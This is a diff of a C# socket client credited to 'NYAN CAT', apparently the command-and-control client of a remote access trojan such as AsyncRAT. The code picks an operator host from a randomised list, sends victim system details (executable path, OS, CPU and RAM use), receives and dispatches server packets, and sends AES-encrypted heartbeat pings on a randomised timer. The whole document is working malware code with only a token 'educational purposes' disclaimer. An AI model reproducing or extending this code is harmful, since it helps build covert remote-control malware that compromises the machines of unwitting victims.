@@ -1,30 +1,36 @@
-﻿using Client.MessagePack;
+﻿using Client.Handle_Packet;
+using Client.Helper;
+using Client.MessagePack;
 using Microsoft.VisualBasic.Devices;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
 using System.Threading;
-using Client.Handle_Packet;
-using Client.Helper;
+
+//       │ Author     : NYAN CAT
+//       │ Name       : Nyan Socket v0.1
+//       │ Contact    : https://github.com/NYAN-x-CAT
+
+//       This program is distributed for educational purposes only.
 
 namespace Client.Sockets
 {
     class ClientSocket
     {
-
         public static Socket Client { get; set; }
         private static byte[] Buffer { get; set; }
         private static long Buffersize { get; set; }
         private static bool BufferRecevied { get; set; }
         private static Timer Tick { get; set; }
         private static MemoryStream MS { get; set; }
-        private static object SendSync { get; set; }
-        private static object EndSendSync { get; set; }
-        public static bool Connected { get; set; }
-        public static PerformanceCounter theCPUCounter;
-        public static PerformanceCounter theMemCounter;
-        public static void InitializeClient()
+        public static bool IsConnected { get; set; }
+        private static object SendSync { get; } = new object();
+        private static object EndSendSync { get; } = new object();
+        private static PerformanceCounter TheCPUCounter { get; } = new PerformanceCounter("Processor", "% Processor Time", "_Total");
+        private static PerformanceCounter TheMemCounter { get; } = new PerformanceCounter("Memory", "% Committed Bytes In Use");
+
+    public static void InitializeClient()
         {
             try
             {
@@ -38,24 +44,19 @@ namespace Client.Sockets
                 Client.Connect(Convert.ToString(Settings.Host.Split(',')[new Random().Next(Settings.Host.Split(',').Length)]),
                     Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
                 Debug.WriteLine("Connected!");
-                Connected = true;
+                IsConnected = true;
                 Buffer = new byte[4];
                 BufferRecevied = false;
                 MS = new MemoryStream();
-                SendSync = new object();
-                EndSendSync = new object();
-                theCPUCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
-                theMemCounter = new PerformanceCounter("Memory", "% Committed Bytes In Use");
-                theCPUCounter.NextValue();
+                TheCPUCounter.NextValue();
                 BeginSend(SendInfo());
-                TimerCallback T = CheckServer;
-                Tick = new Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
+                Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                 Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
             {
                 Debug.WriteLine("Disconnected!");
-                Connected = false;
+                IsConnected = false;
             }
         }
 
@@ -84,24 +85,24 @@ namespace Client.Sockets
                 Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Settings.Version;
-            msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)theCPUCounter.NextValue()}%   RAM {(int)theMemCounter.NextValue()}%";
+            msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
             return msgpack.Encode2Bytes();
         }
 
-        public static void ReadServertData(IAsyncResult Iar)
+        public static void ReadServertData(IAsyncResult ar)
         {
             try
             {
-                if (!Client.Connected)
+                if (!Client.Connected || !IsConnected)
                 {
-                    Connected = false;
+                    IsConnected = false;
                     return;
                 }
 
-                int recevied = Client.EndReceive(Iar);
+                int recevied = Client.EndReceive(ar);
                 if (recevied > 0)
                 {
-                    if (BufferRecevied == false)
+                    if (!BufferRecevied)
                     {
                         MS.Write(Buffer, 0, recevied);
                         Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
@@ -132,13 +133,13 @@ namespace Client.Sockets
                 }
                 else
                 {
-                    Connected = false;
+                    IsConnected = false;
                     return;
                 }
             }
             catch
             {
-                Connected = false;
+                IsConnected = false;
                 return;
             }
         }
@@ -149,9 +150,9 @@ namespace Client.Sockets
             {
                 try
                 {
-                    if (!Client.Connected)
+                    if (!Client.Connected || !IsConnected)
                     {
-                        Connected = false;
+                        IsConnected = false;
                         return;
                     }
 
@@ -164,7 +165,7 @@ namespace Client.Sockets
                 }
                 catch
                 {
-                    Connected = false;
+                    IsConnected = false;
                     return;
                 }
             }
@@ -176,9 +177,9 @@ namespace Client.Sockets
             {
                 try
                 {
-                    if (!Client.Connected)
+                    if (!Client.Connected || !IsConnected)
                     {
-                        Connected = false;
+                        IsConnected = false;
                         return;
                     }
 
@@ -188,7 +189,7 @@ namespace Client.Sockets
                 }
                 catch
                 {
-                    Connected = false;
+                    IsConnected = false;
                     return;
                 }
             }
@@ -196,10 +197,24 @@ namespace Client.Sockets
 
         public static void CheckServer(object obj)
         {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "Ping";
-            msgpack.ForcePathObject("Message").AsString = $"CPU {(int)theCPUCounter.NextValue()}%   RAM {(int)theMemCounter.NextValue()}%";
-            BeginSend(msgpack.Encode2Bytes());
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "Ping";
+                msgpack.ForcePathObject("Message").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
+
+                byte[] buffer = Settings.aes256.Encrypt(msgpack.Encode2Bytes());
+                byte[] buffersize = BitConverter.GetBytes(buffer.Length);
+
+                Client.Poll(-1, SelectMode.SelectWrite);
+                Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
+                Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
+            }
+            catch
+            {
+                IsConnected = false;
+                return;
+            }
         }
     }
 }
